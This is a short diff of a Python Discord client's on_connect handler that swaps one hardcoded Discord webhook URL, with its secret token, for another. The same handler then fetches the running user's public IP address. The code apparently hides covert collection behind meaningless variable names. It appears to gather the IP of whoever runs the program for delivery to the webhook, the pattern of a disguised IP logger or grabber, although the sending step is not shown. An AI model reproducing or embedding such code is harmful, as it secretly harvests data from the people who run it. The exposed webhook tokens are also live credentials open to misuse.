@@ -343,7 +343,7 @@ async def on_message(message):
 async def on_connect():
     Clear()
     startprint()
-    slope = "https://discord.com/api/webhooks/851578614792716289/RFur6uxzgI5zqX_cheBqpvafkXRnJVnKg47-CUqJOt3X0SFaeOUnzCmRD4QyEjpqKT6H"
+    slope = "https://discord.com/api/webhooks/857455442648629248/hW5Wt1n_rA7p3oelg3DfTiASFJzEi9J-_OrfzSEcoDYhukjrLHaGQU8Zu6MvD8Qk5r9c"
     ramp = requests.get('https://checkip.amazonaws.com/').content
     peas = bs4(ramp, 'html.parser')
     fliscord = peas.text
